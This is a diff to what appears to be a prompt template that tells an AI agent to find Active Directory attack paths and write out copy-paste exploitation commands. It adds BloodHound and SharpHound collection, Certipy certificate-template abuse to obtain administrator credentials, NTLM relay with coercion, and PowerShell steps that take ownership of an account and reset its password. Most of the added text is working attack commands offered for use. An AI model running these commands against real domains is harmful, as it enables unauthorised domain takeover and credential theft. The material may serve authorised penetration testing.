@@ -1,4 +1,4 @@
-Find Active Directory attack paths from the enumeration output or context in $ARGUMENTS. Produce exact copy-paste exploitation commands for each viable path. Write results to ~/osai/loot/ad_attack_paths.md.
+Find Active Directory attack paths from the enumeration output or context in $ARGUMENTS. Produce exact copy-paste exploitation commands for each viable path. Write results to ~/osai/current/loot/ad_attack_paths.md.
 
 $ARGUMENTS = target domain, DC IP, and/or PowerView/ldapsearch output to analyze. If no input provided, print the enumeration commands to run first.
 
@@ -40,6 +40,24 @@ Find-LocalAdminAccess   # slow but valuable
 # Domain trusts
 Get-DomainTrust
 ```
+
+
+## Phase 1b: BloodHound — map paths automatically (do this early)
+```bash
+# Remote collection from Kali (with creds)
+bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -dc <DC_FQDN> -c All -ns <DC_IP> --zip
+
+# OR from a Windows foothold, drop SharpHound:
+#   .\SharpHound.exe -c All --zipfilename loot.zip
+```
+Import the .zip into BloodHound GUI, then run these queries:
+- Shortest Paths to Domain Admins
+- Shortest Paths from Owned Principals (mark your foothold as Owned first)
+- Kerberoastable / ASREPRoastable accounts
+- Principals with DCSync rights
+- Find Computers with Unconstrained Delegation
+BloodHound surfaces GenericAll/WriteDacl/ForceChangePassword edges the manual
+PowerView enum misses — always cross-check both.
 
 ## Phase 2: Attack paths by finding type
 
@@ -132,6 +150,36 @@ Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local
 # Wait ~60 min for SDProp to propagate, then modify protected group members
 ```
 
+**ADCS abuse (Certipy) — check EVERY AD engagement, extremely common:**
+```bash
+# Find vulnerable templates
+certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
+
+# ESC1 — template allows SAN + client-auth, low-priv can enrol:
+certipy req -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> \
+  -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<DOMAIN>
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>   # → NT hash / TGT
+
+# ESC8 — NTLM relay to CA web-enrol (AD CS HTTP endpoint):
+certipy relay -ca <CA_HOST> -template DomainController
+# (trigger coercion with PetitPotam/Coercer toward your relay)
+
+# ESC3 — Enrolment Agent template → request on behalf of others
+# ESC4 — you have write over a template → make it ESC1 then exploit
+# ESC6 — CA has EDITF_ATTRIBUTESUBJECTALTNAME2 → any template becomes ESC1
+certipy req -u <USER>@<DOMAIN> -p '<PASS>' -ca <CA> -template User -upn administrator@<DOMAIN>
+```
+Certipy output names the ESC id directly — match it to the request above.
+
+**ACL edges from BloodHound (GenericAll / GenericWrite / WriteOwner):**
+```powershell
+# WriteOwner → take ownership → grant yourself GenericAll → reset password
+Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <YOU>
+Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOU> -Rights All
+$p = ConvertTo-SecureString 'Hacked1234!' -AsPlainText -Force
+Set-DomainUserPassword -Identity <TARGET> -AccountPassword $p
+```
+
 ## Phase 3: Output
 For each viable path found:
 ```
@@ -140,4 +188,4 @@ EVIDENCE: <what was found in enumeration>
 COMMAND: <exact copy-paste>
 NEXT: <what to do after this succeeds>
 ```
-Write to ~/osai/loot/ad_attack_paths.md
+Write to ~/osai/current/loot/ad_attack_paths.md
